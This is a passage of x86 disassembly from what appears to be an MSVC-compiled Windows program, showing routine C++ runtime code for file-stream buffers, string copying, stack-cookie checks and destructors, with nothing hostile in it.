  4041cd:	ff 76 4c             	push   0x4c(%esi)
  4041d0:	50                   	push   %eax
  4041d1:	ff 15 d4 91 40 00    	call   *0x4091d4
  4041d7:	83 c4 08             	add    $0x8,%esp
  4041da:	83 c9 ff             	or     $0xffffffff,%ecx
  4041dd:	3b c1                	cmp    %ecx,%eax
  4041df:	0f 45 cb             	cmovne %ebx,%ecx
  4041e2:	5f                   	pop    %edi
  4041e3:	5e                   	pop    %esi
  4041e4:	8b c1                	mov    %ecx,%eax
  4041e6:	5b                   	pop    %ebx
  4041e7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4041ea:	33 cd                	xor    %ebp,%ecx
  4041ec:	e8 88 28 00 00       	call   0x406a79
  4041f1:	8b e5                	mov    %ebp,%esp
  4041f3:	5d                   	pop    %ebp
  4041f4:	c2 04 00             	ret    $0x4
  4041f7:	8b 7d d4             	mov    -0x2c(%ebp),%edi
  4041fa:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4041fd:	2b f8                	sub    %eax,%edi
  4041ff:	74 14                	je     0x404215
  404201:	ff 76 4c             	push   0x4c(%esi)
  404204:	57                   	push   %edi
  404205:	6a 01                	push   $0x1
  404207:	50                   	push   %eax
  404208:	ff 15 f8 91 40 00    	call   *0x4091f8
  40420e:	83 c4 10             	add    $0x10,%esp
  404211:	3b f8                	cmp    %eax,%edi
  404213:	75 23                	jne    0x404238
  404215:	8d 4d db             	lea    -0x25(%ebp),%ecx
  404218:	c6 46 3d 01          	movb   $0x1,0x3d(%esi)
  40421c:	83 c8 ff             	or     $0xffffffff,%eax
  40421f:	39 4d d0             	cmp    %ecx,-0x30(%ebp)
  404222:	5f                   	pop    %edi
  404223:	5e                   	pop    %esi
  404224:	0f 45 c3             	cmovne %ebx,%eax
  404227:	5b                   	pop    %ebx
  404228:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40422b:	33 cd                	xor    %ebp,%ecx
  40422d:	e8 47 28 00 00       	call   0x406a79
  404232:	8b e5                	mov    %ebp,%esp
  404234:	5d                   	pop    %ebp
  404235:	c2 04 00             	ret    $0x4
  404238:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40423b:	83 c8 ff             	or     $0xffffffff,%eax
  40423e:	5f                   	pop    %edi
  40423f:	5e                   	pop    %esi
  404240:	33 cd                	xor    %ebp,%ecx
  404242:	5b                   	pop    %ebx
  404243:	e8 31 28 00 00       	call   0x406a79
  404248:	8b e5                	mov    %ebp,%esp
  40424a:	5d                   	pop    %ebp
  40424b:	c2 04 00             	ret    $0x4
  40424e:	cc                   	int3
  40424f:	cc                   	int3
  404250:	8b 41 4c             	mov    0x4c(%ecx),%eax
  404253:	85 c0                	test   %eax,%eax
  404255:	74 08                	je     0x40425f
  404257:	50                   	push   %eax
  404258:	ff 15 50 91 40 00    	call   *0x409150
  40425e:	59                   	pop    %ecx
  40425f:	c3                   	ret
  404260:	8b 41 4c             	mov    0x4c(%ecx),%eax
  404263:	85 c0                	test   %eax,%eax
  404265:	74 08                	je     0x40426f
  404267:	50                   	push   %eax
  404268:	ff 15 4c 91 40 00    	call   *0x40914c
  40426e:	59                   	pop    %ecx
  40426f:	c3                   	ret
  404270:	55                   	push   %ebp
  404271:	8b ec                	mov    %esp,%ebp
  404273:	6a ff                	push   $0xffffffff
  404275:	68 00 7e 40 00       	push   $0x407e00
  40427a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404280:	50                   	push   %eax
  404281:	56                   	push   %esi
  404282:	57                   	push   %edi
  404283:	a1 04 c0 40 00       	mov    0x40c004,%eax
  404288:	33 c5                	xor    %ebp,%eax
  40428a:	50                   	push   %eax
  40428b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40428e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404294:	8b f1                	mov    %ecx,%esi
  404296:	83 7e 4c 00          	cmpl   $0x0,0x4c(%esi)
  40429a:	c7 06 44 95 40 00    	movl   $0x409544,(%esi)
  4042a0:	74 1e                	je     0x4042c0
  4042a2:	8b 7e 0c             	mov    0xc(%esi),%edi
  4042a5:	8d 46 3c             	lea    0x3c(%esi),%eax
  4042a8:	39 07                	cmp    %eax,(%edi)
  4042aa:	75 14                	jne    0x4042c0
  4042ac:	8b 56 54             	mov    0x54(%esi),%edx
  4042af:	8b 4e 50             	mov    0x50(%esi),%ecx
  4042b2:	2b d1                	sub    %ecx,%edx
  4042b4:	89 0f                	mov    %ecx,(%edi)
  4042b6:	8b 46 1c             	mov    0x1c(%esi),%eax
  4042b9:	89 08                	mov    %ecx,(%eax)
  4042bb:	8b 46 2c             	mov    0x2c(%esi),%eax
  4042be:	89 10                	mov    %edx,(%eax)
  4042c0:	80 7e 48 00          	cmpb   $0x0,0x48(%esi)
  4042c4:	74 48                	je     0x40430e
  4042c6:	83 7e 4c 00          	cmpl   $0x0,0x4c(%esi)
  4042ca:	74 13                	je     0x4042df
  4042cc:	8b ce                	mov    %esi,%ecx
  4042ce:	e8 fd 02 00 00       	call   0x4045d0
  4042d3:	ff 76 4c             	push   0x4c(%esi)
  4042d6:	ff 15 00 92 40 00    	call   *0x409200
  4042dc:	83 c4 04             	add    $0x4,%esp
  4042df:	8b ce                	mov    %esi,%ecx
  4042e1:	c6 46 48 00          	movb   $0x0,0x48(%esi)
  4042e5:	c6 46 3d 00          	movb   $0x0,0x3d(%esi)
  4042e9:	ff 15 b8 90 40 00    	call   *0x4090b8
  4042ef:	a1 90 c7 40 00       	mov    0x40c790,%eax
  4042f4:	8b 15 94 c7 40 00    	mov    0x40c794,%edx
  4042fa:	c7 46 4c 00 00 00 00 	movl   $0x0,0x4c(%esi)
  404301:	89 46 40             	mov    %eax,0x40(%esi)
  404304:	89 56 44             	mov    %edx,0x44(%esi)
  404307:	c7 46 38 00 00 00 00 	movl   $0x0,0x38(%esi)
  40430e:	8b ce                	mov    %esi,%ecx
  404310:	ff 15 68 90 40 00    	call   *0x409068
  404316:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404319:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404320:	59                   	pop    %ecx
  404321:	5f                   	pop    %edi
  404322:	5e                   	pop    %esi
  404323:	8b e5                	mov    %ebp,%esp
  404325:	5d                   	pop    %ebp
  404326:	c3                   	ret
  404327:	cc                   	int3
  404328:	cc                   	int3
  404329:	cc                   	int3
  40432a:	cc                   	int3
  40432b:	cc                   	int3
  40432c:	cc                   	int3
  40432d:	cc                   	int3
  40432e:	cc                   	int3
  40432f:	cc                   	int3
  404330:	56                   	push   %esi
  404331:	8b f1                	mov    %ecx,%esi
  404333:	8b 4e 14             	mov    0x14(%esi),%ecx
  404336:	83 f9 10             	cmp    $0x10,%ecx
  404339:	72 27                	jb     0x404362
  40433b:	8b 06                	mov    (%esi),%eax
  40433d:	41                   	inc    %ecx
  40433e:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  404344:	72 12                	jb     0x404358
  404346:	8b 50 fc             	mov    -0x4(%eax),%edx
  404349:	83 c1 23             	add    $0x23,%ecx
  40434c:	2b c2                	sub    %edx,%eax
  40434e:	83 c0 fc             	add    $0xfffffffc,%eax
  404351:	83 f8 1f             	cmp    $0x1f,%eax
  404354:	77 1f                	ja     0x404375
  404356:	8b c2                	mov    %edx,%eax
  404358:	51                   	push   %ecx
  404359:	50                   	push   %eax
  40435a:	e8 5d 27 00 00       	call   0x406abc
  40435f:	83 c4 08             	add    $0x8,%esp
  404362:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  404369:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  404370:	c6 06 00             	movb   $0x0,(%esi)
  404373:	5e                   	pop    %esi
  404374:	c3                   	ret
  404375:	ff 15 80 91 40 00    	call   *0x409180
  40437b:	cc                   	int3
  40437c:	cc                   	int3
  40437d:	cc                   	int3
  40437e:	cc                   	int3
  40437f:	cc                   	int3
  404380:	55                   	push   %ebp
  404381:	8b ec                	mov    %esp,%ebp
  404383:	6a ff                	push   $0xffffffff
  404385:	68 20 7e 40 00       	push   $0x407e20
  40438a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404390:	50                   	push   %eax
  404391:	56                   	push   %esi
  404392:	57                   	push   %edi
  404393:	a1 04 c0 40 00       	mov    0x40c004,%eax
  404398:	33 c5                	xor    %ebp,%eax
  40439a:	50                   	push   %eax
  40439b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40439e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4043a4:	8b f1                	mov    %ecx,%esi
  4043a6:	8b 55 08             	mov    0x8(%ebp),%edx
  4043a9:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  4043af:	8b ca                	mov    %edx,%ecx
  4043b1:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4043b8:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  4043bf:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4043c6:	8d 79 01             	lea    0x1(%ecx),%edi
  4043c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  4043d0:	8a 01                	mov    (%ecx),%al
  4043d2:	41                   	inc    %ecx
  4043d3:	84 c0                	test   %al,%al
  4043d5:	75 f9                	jne    0x4043d0
  4043d7:	2b cf                	sub    %edi,%ecx
  4043d9:	51                   	push   %ecx
  4043da:	52                   	push   %edx
  4043db:	8b ce                	mov    %esi,%ecx
  4043dd:	e8 1e 04 00 00       	call   0x404800
  4043e2:	8b c6                	mov    %esi,%eax
  4043e4:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4043e7:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4043ee:	59                   	pop    %ecx
  4043ef:	5f                   	pop    %edi
  4043f0:	5e                   	pop    %esi
  4043f1:	8b e5                	mov    %ebp,%esp
  4043f3:	5d                   	pop    %ebp
  4043f4:	c2 04 00             	ret    $0x4
  4043f7:	cc                   	int3
  4043f8:	cc                   	int3
  4043f9:	cc                   	int3
  4043fa:	cc                   	int3
  4043fb:	cc                   	int3
  4043fc:	cc                   	int3
  4043fd:	cc                   	int3
  4043fe:	cc                   	int3
  4043ff:	cc                   	int3
  404400:	55                   	push   %ebp
  404401:	8b ec                	mov    %esp,%ebp
  404403:	51                   	push   %ecx
  404404:	53                   	push   %ebx
  404405:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404408:	56                   	push   %esi
  404409:	8b f1                	mov    %ecx,%esi
  40440b:	57                   	push   %edi
  40440c:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  404412:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  404419:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  404420:	83 7b 14 10          	cmpl   $0x10,0x14(%ebx)
  404424:	8b 43 10             	mov    0x10(%ebx),%eax
  404427:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40442a:	72 02                	jb     0x40442e
  40442c:	8b 1b                	mov    (%ebx),%ebx
  40442e:	83 f8 10             	cmp    $0x10,%eax
  404431:	73 1c                	jae    0x40444f
  404433:	0f 10 03             	movups (%ebx),%xmm0
  404436:	bf 0f 00 00 00       	mov    $0xf,%edi
  40443b:	0f 11 06             	movups %xmm0,(%esi)
  40443e:	89 46 10             	mov    %eax,0x10(%esi)
  404441:	8b c6                	mov    %esi,%eax
  404443:	89 7e 14             	mov    %edi,0x14(%esi)
  404446:	5f                   	pop    %edi
  404447:	5e                   	pop    %esi
  404448:	5b                   	pop    %ebx
  404449:	8b e5                	mov    %ebp,%esp
  40444b:	5d                   	pop    %ebp
  40444c:	c2 04 00             	ret    $0x4
  40444f:	8b f8                	mov    %eax,%edi
  404451:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  404456:	83 cf 0f             	or     $0xf,%edi
  404459:	3b f8                	cmp    %eax,%edi
  40445b:	0f 47 f8             	cmova  %eax,%edi
  40445e:	8d 47 01             	lea    0x1(%edi),%eax
  404461:	3d 00 10 00 00       	cmp    $0x1000,%eax
  404466:	72 25                	jb     0x40448d
  404468:	8d 48 23             	lea    0x23(%eax),%ecx
  40446b:	3b c8                	cmp    %eax,%ecx
  40446d:	76 56                	jbe    0x4044c5
  40446f:	51                   	push   %ecx
  404470:	e8 12 26 00 00       	call   0x406a87
  404475:	83 c4 04             	add    $0x4,%esp
  404478:	85 c0                	test   %eax,%eax
  40447a:	74 0b                	je     0x404487
  40447c:	8d 48 23             	lea    0x23(%eax),%ecx
  40447f:	83 e1 e0             	and    $0xffffffe0,%ecx
  404482:	89 41 fc             	mov    %eax,-0x4(%ecx)
  404485:	eb 19                	jmp    0x4044a0
  404487:	ff 15 80 91 40 00    	call   *0x409180
  40448d:	85 c0                	test   %eax,%eax
  40448f:	74 0d                	je     0x40449e
  404491:	50                   	push   %eax
  404492:	e8 f0 25 00 00       	call   0x406a87
  404497:	83 c4 04             	add    $0x4,%esp
  40449a:	8b c8                	mov    %eax,%ecx
  40449c:	eb 02                	jmp    0x4044a0
  40449e:	33 c9                	xor    %ecx,%ecx
  4044a0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4044a3:	40                   	inc    %eax
  4044a4:	89 0e                	mov    %ecx,(%esi)
  4044a6:	50                   	push   %eax
  4044a7:	53                   	push   %ebx
  4044a8:	51                   	push   %ecx
  4044a9:	e8 13 35 00 00       	call   0x4079c1
  4044ae:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4044b1:	83 c4 0c             	add    $0xc,%esp
  4044b4:	89 46 10             	mov    %eax,0x10(%esi)
  4044b7:	8b c6                	mov    %esi,%eax
  4044b9:	89 7e 14             	mov    %edi,0x14(%esi)
  4044bc:	5f                   	pop    %edi
  4044bd:	5e                   	pop    %esi
  4044be:	5b                   	pop    %ebx
  4044bf:	8b e5                	mov    %ebp,%esp
  4044c1:	5d                   	pop    %ebp
  4044c2:	c2 04 00             	ret    $0x4
  4044c5:	e8 06 cc ff ff       	call   0x4010d0
  4044ca:	cc                   	int3
  4044cb:	cc                   	int3
  4044cc:	cc                   	int3
  4044cd:	cc                   	int3
  4044ce:	cc                   	int3
  4044cf:	cc                   	int3
  4044d0:	55                   	push   %ebp
  4044d1:	8b ec                	mov    %esp,%ebp
  4044d3:	56                   	push   %esi
  4044d4:	8b f1                	mov    %ecx,%esi
  4044d6:	e8 95 fd ff ff       	call   0x404270
  4044db:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  4044df:	74 0b                	je     0x4044ec
  4044e1:	6a 58                	push   $0x58
  4044e3:	56                   	push   %esi
  4044e4:	e8 d3 25 00 00       	call   0x406abc
  4044e9:	83 c4 08             	add    $0x8,%esp
  4044ec:	8b c6                	mov    %esi,%eax
  4044ee:	5e                   	pop    %esi
